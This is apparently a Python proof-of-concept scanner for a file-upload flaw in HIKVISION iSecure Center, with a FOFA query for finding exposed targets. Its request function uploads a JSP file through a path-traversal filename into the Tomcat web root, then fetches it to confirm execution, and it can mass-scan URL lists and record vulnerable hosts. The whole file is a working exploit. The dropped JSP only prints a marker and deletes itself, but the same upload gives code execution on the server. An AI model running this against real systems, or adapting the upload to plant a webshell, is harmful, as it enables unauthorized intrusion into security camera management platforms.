#!/usr/bin/python3.7
# -*- coding: utf-8 -*-
#fofa: app="HIKVISION-iSecure-Center"

import os
import time
from urllib import response
from urllib.parse import urljoin
from weakref import proxy
import requests
from threading import Lock
from concurrent.futures import ThreadPoolExecutor
from argparse import ArgumentParser

requests.packages.urllib3.disable_warnings()

class POC:
    def __init__(self):
        self.banner()
        self.args = self.parseArgs()

        if self.args.file:
            self.init()
            self.urlList = self.loadURL()  
            self.multiRun()
            self.start = time.time()
        else:
            self.verfyurl()  
    
    def banner(self):
        logo = r"""
  _  _____                                  _____           _              _____   _____ ______ 
 (_)/ ____|                                / ____|         | |            |  __ \ / ____|  ____|
  _| (___   ___  ___ _   _ _ __ ___ ______| |     ___ _ __ | |_ ___ _ __  | |__) | |    | |__   
 | |\___ \ / _ \/ __| | | | '__/ _ \______| |    / _ \ '_ \| __/ _ \ '__| |  _  /| |    |  __|  
 | |____) |  __/ (__| |_| | | |  __/      | |___|  __/ | | | ||  __/ |    | | \ \| |____| |____ 
 |_|_____/ \___|\___|\__,_|_|  \___|       \_____\___|_| |_|\__\___|_|    |_|  \_\\_____|______|                                                                                                   
                                                                        author： Sweelg
                                                                        GitHub： https://github.com/Sweelg                 
        """
        print("\033[91m" + logo + "\033[0m")

    def parseArgs(self):
        date = time.strftime("%Y-%m-%d_%H-%M-%S", time.localtime())
        parser = ArgumentParser()
        parser.add_argument("-u", "--url", required=False, type=str, help="Target url(e.g. http://127.0.0.1)")
        parser.add_argument("-f", "--file", required=False, type=str, help=f"Target file(e.g. url.txt)")
        parser.add_argument("-t", "--thread", required=False, type=int, default=5, help=f"Number of thread (default 5)")
        parser.add_argument("-T", "--timeout", required=False, type=int, default=3,  help="Request timeout (default 3)")
        parser.add_argument("-o", "--output", required=False, type=str, default=date,  help=f"Vuln url output file (e.g. result.txt)")
        parser.add_argument("-p", "--proxy", default=None, help="Request Proxy (e.g http://127.0.0.1:8080)")
        return parser.parse_args()
    
    def proxy_server(self):
        proxy = self.args.proxy
        return proxy

    def init(self):
        print("\nthread:", self.args.thread)
        print("timeout:", self.args.timeout)
        msg = ""
        if os.path.isfile(self.args.file):
            msg += "Load url file successfully\n"
        else:
            msg += f"\033[31mLoad url file {self.args.file} failed\033[0m\n"
        print(msg)
        if "failed" in msg:
            print("Init failed, Please check the environment.")
            os._exit(0)
        print("Init successfully")


    def respose(self, url):
        proxy = self.args.proxy
        proxies = None
        if proxy:
            proxies = {"http": proxy, "https": proxy}
        path = "/center/api/files;.js"
        url = urljoin(url, path)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",        
            "Content-Type": "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae"
        }
        data = '--502f67681799b07e4de6b503655f5cae\nContent-Disposition: form-data; name="file"; filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/hello.jsp"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMzAzOTMzNzNjNWI0Mw==")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--502f67681799b07e4de6b503655f5cae--'
        try:
            response = requests.post(url, headers=headers, data=data, proxies=proxies, timeout=self.args.timeout, verify=False)
            path2 = "/clusterMgr/hello.jsp;js"
            header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",        
        }
            resurl = urljoin(url, path2)
            response2 = requests.get(resurl, headers=header, proxies=proxies, timeout=self.args.timeout, verify=False)            
            resp = response2.text
            return resp               
        except:
            return "conn"  

    def verfyurl(self):
        url = self.args.url
        repData = self.respose(url)
        if "e165421110ba03099a30393373c5b43" in repData:
            print("[+] 漏洞存在！！！[✅] url: {}".format(url))        
        elif "conn" in repData:
            print("[-] URL连接失败！ [-] url: {}".format(url))
        else:
            print("[x] 未检测到漏洞！[x] url: {}".format(url))


    def verify(self, url):
            repData = self.respose(url)
            if "e165421110ba03099a30393373c5b43" in repData:
                msg = "[+] 漏洞存在！！！[✅] url: {}".format(url)
                self.lock.acquire()
                try:
                    self.findCount +=1
                    self.vulnRULList.append(url)
                finally:
                    self.lock.release()
            elif "conn" in repData:
                msg = "[-] URL连接失败！ [-] url: {}".format(url)
            else:
                msg = "[x] 未检测到漏洞！[x] url: {}".format(url)
            self.lock.acquire()
            try:
                print(msg)
            finally:
                self.lock.release()
       

    def loadURL(self):
        urlList = []
        with open(self.args.file, encoding="utf8") as f:
            for u in f.readlines():
                u = u.strip()
                urlList.append(u)
        return urlList
        
    def multiRun(self):
        self.findCount = 0
        self.vulnRULList = []
        self.lock = Lock()
        executor = ThreadPoolExecutor(max_workers=self.args.thread)
        if self.args.url:
            executor.map(self.verify, self.url)
        else:
            executor.map(self.verify, self.urlList)

    def output(self):
        if not os.path.isdir(r"./output"):
            os.mkdir(r"./output")
        self.outputFile = f"./output/{self.args.output}.txt"
        with open(self.outputFile, "a") as f:
            for url in self.vulnRULList:
                f.write(url + "\n")

    def __del__(self):
        try:
            print("\nAlltCount：\033[31m%d\033[0m\nVulnCount：\033[32m%d\033[0m" % (len(self.urlList), self.findCount))
            self.end = time.time()
            print("Time Spent: %.2f" % (self.end - self.start))
            self.output()
            print("-" * 20, f"\nThe vulnURL has been saved in {self.outputFile}\n")
        except:
            pass

if __name__ == "__main__":
    POC()
